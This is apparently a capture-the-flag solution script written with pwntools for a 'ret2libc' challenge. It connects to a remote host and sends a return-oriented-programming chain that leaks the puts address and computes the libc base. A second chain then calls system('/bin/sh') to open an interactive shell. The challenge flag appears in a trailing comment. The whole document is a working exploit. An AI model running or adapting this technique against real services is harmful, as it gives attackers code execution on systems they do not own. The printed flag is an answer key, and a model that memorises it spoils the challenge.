
from ctypes import LibraryLoader
from pwn import *

context.arch = 'amd64'

# r = process('./ret2libc')

r = remote('143.198.127.103', 42001)

libc = ELF('./libc-2.31.so', checksec=False)
e = ELF('./ret2libc', checksec=False)

puts_off = libc.sym.puts

r.recvuntil(b'[y/N]\n')

rop_ = ROP(e)

rop_.call(e.sym.puts, [e.got.puts])
rop_.call(e.sym.main)

r.sendline(fit({ 40:rop_.chain() }))

LIBC_BASE = int.from_bytes(r.recvuntil(b'[y/N]\n').split()[7], byteorder='little') - puts_off

libc.address = LIBC_BASE

rop_ = ROP(libc)
rop_.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])


r.sendline(fit({ 40:rop_.chain() }))

r.interactive()

# flag{th3_wh0l3_us3l3r4nd_1s_my_pl4ygr0und}
